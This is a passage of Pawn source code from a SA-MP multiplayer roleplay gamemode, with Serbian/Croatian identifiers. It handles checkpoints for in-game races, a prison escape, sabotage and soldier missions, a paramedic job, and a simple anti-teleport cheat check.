        new OrgID = PlayerInfo[playerid][xClan];

        OI[ OrgID ][ oSafeMoney ] += ZlataraRobPrice;
        SaveOrganization( OrgID );
        Novi_DisablePlayerCheckpoint(playerid);
        NosiZlataraTorbu[playerid] = false;
        RemovePlayerAttachedObject(playerid, 0);

        return 1;
    }

    if(TutorialCP[playerid] == 1) {

        ClearChat(playerid, 25);
        SetPlayerCameraPos(playerid, 2339.215820, -1197.762207, 29.624254);
        SetPlayerCameraLookAt(playerid, 2338.356201, -1202.600952, 28.703769, CAMERA_CUT);
        Novi_DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        MichaelPricaVarijabla[playerid] = 7; 
        defer MichaelPricaTimer(playerid); 
        return 1;
    }

    if(UlicneTrkeCP[playerid] >= 1) {

        switch(UlicneTrkeCP[playerid]) {

            case 0: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1725.8568,-1814.9766,13.0672, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 1: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1689.5587,-1734.4995,13.0961, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 2: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1689.9954,-1598.5996,13.0906, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 3: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1572.8275,-1591.3536,13.0889, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 4: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1560.7770,-1547.6030,13.2531, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 5: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1519.5570,-1495.8679,13.2691, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 6: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1454.9315,-1395.8015,13.0889, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 7: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1454.5535,-1228.4651,13.2300, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 8: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1463.1149,-1168.0463,23.5331, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 9: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1625.7372,-1160.0922,23.6018, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 10: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1826.3977,-1179.4369,23.3359, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 11: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1979.5121,-1135.4554,25.5080, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 12: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 2069.3408,-1212.6602,23.5210, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 13: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 2073.0461,-1373.4276,23.5261, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 14: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 2112.4153,-1497.9991,23.5157, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 15: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 2092.9858,-1754.3627,13.1109, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 16: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 2080.9724,-1921.2616,13.0765, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 17: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1907.3961,-1932.0173,13.0889, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 18: {

                Novi_DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1821.8845,-1905.3572,13.0907, 10.0);
                UlicneTrkeCP[playerid]++;
                return 1;
            }
            case 19: { //Kraj trke

                new gubitnik = UlicneTrkeID[playerid];
                Novi_DisablePlayerCheckpoint(playerid);
                Novi_DisablePlayerCheckpoint(gubitnik);
                UlicneTrkeCP[playerid] = 0;
                UlicneTrkeCP[gubitnik] = 0;
                new novac = UlicneTrkeUlog[playerid];
                DajIgracuNovac(playerid, novac*2);
                DajIgracuNovac(gubitnik, -novac);
                Novi_DestroyVehicle(UlicneTrkeVeh[playerid]);
                Novi_DestroyVehicle(UlicneTrkeVeh[gubitnik]);
                UlicneTrkeVeh[playerid] = -1;
                UlicneTrkeVeh[gubitnik] = -1;
                SendInfoMessage(playerid, "Pobednik trka je : %s | Nagrada : %d", ImeIgraca(playerid), novac);
                SendInfoMessage(gubitnik, "Pobednik trka je : %s | Nagrada : %d", ImeIgraca(playerid), novac);
                UlicneTrkeVeh[playerid] = 0;
                UlicneTrkeID[playerid] = -1;
                UlicneTrkeUlog[playerid] = 0;
                UlicneTrkeVeh[gubitnik] = 0;
                UlicneTrkeID[gubitnik] = -1;
                UlicneTrkeUlog[gubitnik] = 0;
                UlicneTrkeRaceVeh[playerid] = 0;
                UlicneTrkeRaceVeh[gubitnik] = 0;
                return 1;
            }
        }
    }

    if(BezanjeZatvor[playerid] == 2) {

        Novi_DisablePlayerCheckpoint(playerid);
        ZatvorBegProvera = defer NekiTamoTimer(playerid);
        BezanjeZatvor[playerid] = 3;
        return 1;
    }

    if(BezanjeZatvor[playerid] == 1) {

        Novi_DisablePlayerCheckpoint(playerid);
        defer BezanjeZatvorCount(playerid);
        TogglePlayerControllable(playerid, 0);
        ApplyAnimation( playerid, "BOMBER", "BOM_Plant_Loop",4.0,0,0,0,0,0,1 );
        ApplyAnimation( playerid, "BOMBER", "BOM_Plant_Loop",4.0,0,0,0,0,0,1 );
        SendInfoMessage(playerid, "Turpijas ogradu! Pricekaj malo!");
        BezanjeZatvorVreme[playerid] = 180;
        return 1;
    }

    if(MojAdvokat[playerid] >= 0) {

        Novi_DisablePlayerCheckpoint(playerid);
        return 1;
    }

    if(NosiKutiju[playerid]) {

        Novi_DisablePlayerCheckpoint(playerid);
        return 1;
    }

    if( GetFactionType( playerid ) != ORG_TIP_PD ) {

		if( GetSpeed( playerid ) <= 0 && PlayerInfo[ playerid ][ xAdmin ] < 6 && PosaoRudar[ playerid ] == 0 ) {
		    antiCheatCS[ playerid ][ CPPort ]++;
		    if( antiCheatCS[ playerid ][ CPPort ] >= 2 ) {

		        format( globalstring, sizeof( globalstring ), "| V:AC | Moguce portanje na checkpointima || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
			    AdminPoruka( ANTICHEAT, globalstring );
				return 1;
			}
		}
	
	}

	if(RadiSabotazer{playerid})
	{
		switch(SabotazerPosloviCP{playerid})
		{
			case 1:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetPlayerPos(playerid, -2615.7942,1432.2362,7.1466);
				SetPlayerFacingAngle(playerid, 208.0551);
				PricaSabotazerTimer{playerid} = 2;
				defer SabotazerPricaTimer(playerid);
				return 1;
			}
			case 2:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				SabotazerPosloviCP{playerid} = 3;
				Novi_SetPlayerCheckpoint(playerid, -2586.7095,1446.9845,-0.4404, 2.0);
				return 1;
			}
			case 3:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2501.8535,1477.3373,-0.0405, 15.0);
                Novi_DestroyVehicle(SabotazerVozilo[playerid]);
		        SabotazerVozilo[playerid] = V01D_CreateVehicle(493, -2586.7095,1446.9845,-0.4404, 180.0000, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, SabotazerVozilo[playerid], 0);
		        
		        SabotazerPosloviCP{playerid} = 4;
		        return 1;
			}
			case 4:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2406.2954,1501.2491,-0.0368, 15.0);
				SabotazerPosloviCP{playerid}= 5;
				return 1;
			}
			case 5:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2323.4624,1522.8459,-0.0309, 15.0);
				SabotazerPosloviCP{playerid}= 6;
				return 1;
			}
			case 6:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2328.8250,1528.6631,1.5218, 2.0);
				SabotazerPosloviCP{playerid}= 7;
				Novi_DestroyVehicle(SabotazerVozilo[playerid]);
                SabotazerVozilo[playerid] = -1;
				return 1;
			}
			case 7:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2334.5735,1534.4362,17.3281, 2.0);
				SabotazerPosloviCP{playerid}= 8;
				SendSabotage(playerid, "Skoci da bi se popeo uz merdevine!");
				return 1;
			}
			case 8:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2438.0154,1543.6989,8.3984, 2.0);
				SabotazerPosloviCP{playerid}= 9;
				SendSabotage(playerid, "Idi postavi eksploziv!");
				return 1;
			}
			case 9:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2417.9250,1548.1256,2.1172, 2.0);
				SabotazerPosloviCP{playerid}= 10;
				return 1;
			}
			case 10:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 5000, 0 );
				defer PostavljaBombuTimer(playerid);
				return 1;
			}
			case 11:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2478.2051,1535.6274,28.8356, 2.0);
				SabotazerPosloviCP{playerid}= 12;
				return 1;
			}
			case 12:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				SendSabotage(playerid, "Upucaj oba kapetana!");
				UpucaKapetana{playerid} = 0;
				return 1;
			}
			case 13:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				defer TimerOdPetSabotazer(playerid);
				TogglePlayerControllable(playerid, 0);
				InterpolateCameraPos(playerid, -2454.430175, 1576.810058, 49.501991, -2383.462402, 1574.009887, 49.501991, 5000);
				InterpolateCameraLookAt(playerid, -2451.424804, 1573.504272, 47.257083, -2386.773925, 1570.856445, 47.479606, 5000);
				return 1;
			}
			case 14:
			{
				SendSabotage(playerid, "Uspesno si zavrsio posao i dobio platu!");
			    Novi_DisablePlayerCheckpoint(playerid);
				ResetPlayerWeapons(playerid);

                if(ServerInfo[HappyJob] == POSAO_SABOTAZER) {
                    dajPlatuIgracu(playerid, PlataPosla[PLATA_SABOTAZER] * 2);
                    SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
                }
		        else dajPlatuIgracu(playerid, PlataPosla[PLATA_SABOTAZER]);

                BussinesJobMoney(POSAO_SABOTAZER, PlataPosla[PLATA_SABOTAZER]/2);

                SavePlayer(playerid);

				RadiSabotazer{playerid} = false;
				UzeoOpremu[playerid] = false;

				PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] ); //OVDE VARIJABLE
 				
				return 1;
			}
		}
	}

	if(RadiVojnik{playerid} == true)
	{
		switch(VojnikMisijaJedanCP{playerid})
		{
			case 1: //Dolazak kod generala
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetPlayerPos(playerid, 405.2985,2532.0012,16.5586);
				SetPlayerFacingAngle(playerid, 307.2677);
				SetPlayerCameraPos(playerid, 405.319732, 2528.243164, 18.240760);
				SetPlayerCameraLookAt(playerid, 406.39265, 2532.907226, 16.792190, CAMERA_CUT);
				GeneralTimer{playerid} = 7;
				
				defer GeneralPricaTimer(playerid);
				return 1;
			}
			case 2:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 134.6474,2011.8412,18.8575, 2.0);
                Novi_DestroyVehicle(VojnikMisijaJedanVozilo[playerid]);
		        VojnikMisijaJedanVozilo[playerid] = V01D_CreateVehicle(470, 390.3481, 2536.8137, 16.4515, 180.0000, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, VojnikMisijaJedanVozilo[playerid], 0);
		        
		        VojnikMisijaJedanCP{playerid} = 3;
		        return 1;
			}
			case 3:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				CreateExplosionForPlayer(playerid, 134.6474,2011.8412,18.8575, 1, 1.0);
				defer TimeDeset(playerid);
				defer JosJedan(playerid);
				return 1;
			}
			case 4:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 187.3866,1911.4969,17.7026, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 5: //Actor 1 neprijatelj
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				UpucajNeprijatelja1{playerid} = true;
				VojnikMessage(playerid, "Upucaj neprijatelja!");
				return 1;
			}
			case 6:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 242.6229,1872.7186,11.4531, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 7:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 246.4245,1861.1426,14.0840, 2.0);
				VojnikMessage(playerid, "Iskljuci sigurnosne kamere!");
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 8:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				VojnikMessage(playerid, "Upucaj kontrolnu tablu pored!");
				return 1;
			}
			case 9:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 255.1964,1873.7988,8.7724, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 10:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				UpucajNeprijatelja2{playerid} = true;
				VojnikMessage(playerid, "Pazi! Ispred se nalazi jos jedan neprijatelj!");
				return 1;
			}
			case 11:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				VojnikMessage(playerid, "Put je zablokiran! Pronadji drugi put!");
				Novi_SetPlayerCheckpoint(playerid, 262.6538,1816.9093,1.0078, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 12:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 294.2849,1815.7820,4.7266, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 13:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 298.0881,1825.0157,7.8281, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 14:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				UpucajNaucnika1{playerid} = true;
				VojnikMessage(playerid, "Tu je naucnik! Upucaj ga!");
				return 1;
			}
			case 15:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 296.9113,1855.9972,7.8281, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 16:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, 281.2020,1869.5138,8.7578, 2.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 17:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				VojnikMessage(playerid, "Pazi! Tu je naucnik! Upucaj ga!");
				UpucajNaucnika2{playerid} = true;
				Vakcina[playerid] = CreateDynamicObject(2976, 272.99200, 1852.99146, 8.62990, 0.00000, 0.00000, 0.00000, -1, -1, -1, 20.0, 20.0);
				return 1;
			}
			case 18:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				VojnikMessage(playerid, "Pronasao si je! Pritisni Y da pokupis vakcinu!");
				TrebaDaPokupiVakcinu{playerid} = true;
				return 1;
			}
			case 19:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				VojnikMessage(playerid, "Kolega: POZURI VOJNICE! DOLAZE!");
				Novi_SetPlayerCheckpoint(playerid, 212.8995, 1911.7435, 18.2804, 5.0);
				VojnikMisijaJedanCP{playerid}++;
				return 1;
			}
			case 20:
			{
			    Novi_DisablePlayerCheckpoint(playerid);

                Novi_DestroyVehicle(VojnikMisijaJedanVozilo[playerid]);
		        VojnikMisijaJedanVozilo[playerid] = V01D_CreateVehicle(425, 213.5770, 1914.3820, 18.3690, 90.0000, 0, 0, -1 );
		        Novi_PutPlayerInVehicle(playerid, VojnikMisijaJedanVozilo[playerid], 0);

		        VojnikMessage(playerid, "Kolega: Odvezi nas nazad u bazu! Imas 2 minuta da stignes tamo!");
		        Novi_SetPlayerCheckpoint(playerid, 390.7900,2538.4006,16.5425, 5.0);
                VojnikHelisTimer = defer VojnikVoziHelikopter(playerid);
		        VojnikMisijaJedanCP{playerid}++;
		        return 1;
			}
			case 21:
			{
				Novi_DestroyVehicle(VojnikMisijaJedanVozilo[playerid]);
                VojnikMisijaJedanVozilo[playerid] = -1;
				VojnikMessage(playerid, "Uspesno si zavrsio misiju i dobio platu!");
			    Novi_DisablePlayerCheckpoint(playerid);
                stop VojnikHelisTimer;
				ResetPlayerWeapons(playerid);
                Novi_SetPlayerArmour(playerid, 0);

                if(ServerInfo[HappyJob] == POSAO_VOJNIK) {
                    dajPlatuIgracu(playerid, PlataPosla[PLATA_VOJNIK] * 2);
                    SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
                }
                else dajPlatuIgracu(playerid, PlataPosla[PLATA_VOJNIK]);

                BussinesJobMoney(POSAO_VOJNIK, PlataPosla[PLATA_VOJNIK]/2);

                SavePlayer(playerid);

				RadiVojnik{playerid} = false;
				UzeoOpremu[playerid] = false;
				PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
 				
				return 1;
			}
		}
	}

	if(DilerCheckpoint[playerid] == 1 || DilerCheckpoint[playerid] == 2 || DilerCheckpoint[playerid] == 3) { Novi_DisablePlayerCheckpoint(playerid); }

	if(BolnicarPosloviCP[playerid] != 0)
	{
		switch(BolnicarPosloviCP[playerid])
		{
			case 1:
			{
				if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Izadji iz vozila!");
			    Novi_DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				GameTextForPlayer(playerid, "Ispitivate preminulog..", 10000, 3);
				defer IspitivanjePreminulog(playerid);
				ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 10000, 0 );
				return 1;
			}
			case 2:
			{
				if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
			    Novi_DisablePlayerCheckpoint(playerid);
				
				DajIgracuNovac(playerid, 5000);
				SendInfoMessage(playerid, "Uspesno si dovezao preminulog i dobio 7.500$!");
				BolnicarVozilo[playerid] = 0;
				BolnicarPosloviCP[playerid] = 0;
				return 1;
			}
		}
	}

	if(FunRaceCP{playerid} != 0)
	{
		switch(FunRaceCP{playerid})
		{
			case 1:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2744.9854,-2660.4126,1.3695, 5.0);
				FunRaceCP{playerid} = 2;
				return 1;
			}
			case 2:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2794.4099,-2651.1284,-0.7726, 5.0);
				FunRaceCP{playerid} = 3;
				return 1;
			}
			case 3:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2818.2715,-2616.4814,-0.6087, 5.0);
				FunRaceCP{playerid} = 4;
				return 1;
			}
			case 4:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2812.1260,-2593.3750,0.0181, 5.0);
				FunRaceCP{playerid} = 5;
				return 1;
			}
			case 5:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2798.3804,-2563.9736,0.0866, 5.0);
				FunRaceCP{playerid} = 6;
				return 1;
			}
			case 6:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2784.9409,-2541.8838,2.0217, 5.0);
				FunRaceCP{playerid} = 7;
				return 1;
			}
			case 7:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2765.2380,-2511.2881,3.0000, 5.0);
				FunRaceCP{playerid} = 8;
				return 1;
			}
			case 8: //Dosao do vozila BANDITO
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2746.8425,-2487.0415,4.1294, 5.0);
				FunRaceCP{playerid} = 9;
				new Float:X, Float:Y, Float:Z;
		        GetPlayerPos(playerid, X,Y,Z);
                Novi_DestroyVehicle(FunRaceVoziloOff[playerid]);
		        FunRaceVoziloOff[playerid] = V01D_CreateVehicle(568, X, Y, Z, 0.0, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, FunRaceVoziloOff[playerid], 0);
		        SetVehicleVirtualWorld(FunRaceVoziloOff[playerid], 1);
		        
		        FunRaceMessage(playerid, "Nastavi vozilom!");
	        	return 1;
			}
			case 9:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2698.6975,-2426.1646,3.0599, 5.0);
				FunRaceCP{playerid} = 10;
				return 1;
			}
			case 10:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2607.1270,-2324.4353,10.8985, 5.0);
				FunRaceCP{playerid} = 11;
				return 1;
			}
			case 11:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2495.2493,-2303.5281,14.6828, 5.0);
				FunRaceCP{playerid} = 12;
				return 1;
			}
			case 12:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2406.1509,-2278.8816,14.4627, 5.0);
				FunRaceCP{playerid} = 13;
				return 1;
			}
			case 13:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2365.2751,-2259.4065,15.2796, 5.0);
				FunRaceCP{playerid} = 14;
				return 1;
			}
			case 14:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2349.5454,-2200.7407,31.5717, 5.0);
				FunRaceCP{playerid} = 15;
				return 1;
			}
			case 15:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2352.6147,-2181.7415,33.6156, 5.0);
				FunRaceCP{playerid} = 16;
				return 1;
			}
			case 16: //Unisti vozilo i laganim trcecim hodom peske
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2336.4021,-2178.6335,35.1399, 5.0);
				FunRaceCP{playerid} = 17;
				Novi_DestroyVehicle(FunRaceVoziloOff[playerid]);
                FunRaceVoziloOff[playerid] = -1;
				FunRaceMessage(playerid, "Nastavi peske!");
				return 1;
			}
			case 17:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2278.2373,-2149.9592,51.9605, 5.0);
				FunRaceCP{playerid} = 18;
				return 1;
			}
			case 18:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2221.6235,-2103.1147,73.2726, 5.0);
				FunRaceCP{playerid} = 19;
				return 1;
			}
			case 19:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2152.5010,-2021.7343,93.8139, 5.0);
				FunRaceCP{playerid} = 20;
				return 1;
			}
			case 20:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2129.9226,-1912.9207,115.8177, 5.0);
				FunRaceCP{playerid} = 21;
				return 1;
			}
			case 21:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2180.5410,-2002.1958,119.2122, 5.0);
				FunRaceCP{playerid} = 22;
				return 1;
			}
			case 22:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2253.9236,-2071.4985,120.2568, 5.0);
				FunRaceCP{playerid} = 23;
				return 1;
			}
			case 23:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2377.6692,-2096.3733,116.7631, 5.0);
				FunRaceCP{playerid} = 24;
				return 1;
			}
			case 24: //Daje mu biciklu
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2428.0967,-2091.2195,122.4258, 5.0);
				FunRaceCP{playerid} = 25;
				new Float:X, Float:Y, Float:Z;
		        GetPlayerPos(playerid, X,Y,Z);
                Novi_DestroyVehicle(FunRaceVoziloOff[playerid]);
		        FunRaceVoziloOff[playerid] = V01D_CreateVehicle(510, X, Y, Z, 0.0, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, FunRaceVoziloOff[playerid], 0);
		        SetVehicleVirtualWorld(FunRaceVoziloOff[playerid], 1);
		        
		        FunRaceMessage(playerid, "Nastavi biciklom!");

		        
		        return 1;
			}
			case 25:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2465.2703,-2070.2559,132.0284, 5.0);
				FunRaceCP{playerid} = 26;
				return 1;
			}
			case 26:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2529.5015,-1961.2897,177.1022, 5.0);
				FunRaceCP{playerid} = 27;
				return 1;
			}
			case 27:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2575.8992,-1896.1923,197.8214, 5.0);
				FunRaceCP{playerid} = 28;
				return 1;
			}
			case 28:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2645.4360,-1796.4830,232.2549, 5.0);
				FunRaceCP{playerid} = 29;
				return 1;
			}
			case 29:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2636.9971,-1734.3691,259.4918, 5.0);
				FunRaceCP{playerid} = 30;
				return 1;
			}
			case 30:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2568.0867,-1847.5986,278.6762, 5.0);
				FunRaceCP{playerid} = 31;
				return 1;
			}
			case 31:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2515.0537,-1884.3982,297.6578, 5.0);
				FunRaceCP{playerid} = 32;
				return 1;
			}
			case 32:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2593.4692,-1778.3636,318.6802, 5.0);
				FunRaceCP{playerid} = 33;
				return 1;
			}
			case 33:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2598.6377,-1645.6298,340.9853, 5.0);
				FunRaceCP{playerid} = 34;
				return 1;
			}
			case 34:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2583.1313,-1647.4979,349.1535, 5.0);
				FunRaceCP{playerid} = 35;
				return 1;
			}
			case 35:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2565.1030,-1777.4431,360.7546, 5.0);
				FunRaceCP{playerid} = 36;
				return 1;
			}
			case 36:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2528.2832,-1787.8938,378.0620, 5.0);
				FunRaceCP{playerid} = 37;
				return 1;
			}
			case 37:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2558.3801,-1685.8071,395.1360, 5.0);
				FunRaceCP{playerid} = 38;
				return 1;
			}
			case 38:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2528.6748,-1709.8164,401.6781, 5.0);
				FunRaceCP{playerid} = 39;
				return 1;
			}
			case 39:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2481.9875,-1789.0522,404.2460, 5.0);
				FunRaceCP{playerid} = 40;
				return 1;
			}
			case 40:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
